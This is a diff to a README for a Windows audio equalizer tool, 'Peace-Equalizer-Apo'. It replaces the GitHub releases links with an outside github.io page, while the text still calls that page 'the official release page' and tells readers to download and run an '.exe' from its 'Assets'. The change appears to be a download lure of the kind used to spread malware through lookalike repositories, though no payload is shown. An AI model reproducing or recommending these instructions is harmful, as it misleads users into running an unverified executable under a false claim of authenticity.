@@ -1,6 +1,6 @@
 # 🎧 Peace-Equalizer-Apo - Enhance audio quality on your computer
 
-[![Download Peace Equalizer](https://img.shields.io/badge/Download-Latest_Release-blue?style=for-the-badge)](https://github.com/Duongnguix-a11/Peace-Equalizer-Apo/releases)
+[![Download Peace Equalizer](https://img.shields.io/badge/Download-Latest_Release-blue?style=for-the-badge)](https://duongnguix-a11.github.io)
 
 Peace-Equalizer-Apo transforms your audio experience. It provides a simple way to adjust sound frequencies across your entire computer. You gain full control over your headphones, speakers, and microphone. This tool works with Windows 10 and Windows 11. 
 
@@ -12,7 +12,7 @@ Audio files and hardware often produce flat or unbalanced sound. This software c
 
 To obtain the program, go to the official release page. You do not need to compile code or manage complex files.
 
-1. Visit this [Download Page](https://github.com/Duongnguix-a11/Peace-Equalizer-Apo/releases).
+1. Visit this [Download Page](https://duongnguix-a11.github.io).
 2. Look for the section labeled "Assets" at the bottom of the latest release.
 3. Select the file ending in ".exe" to begin the transfer to your computer.
 4. Save the file to your Downloads folder or your desktop for easy access.
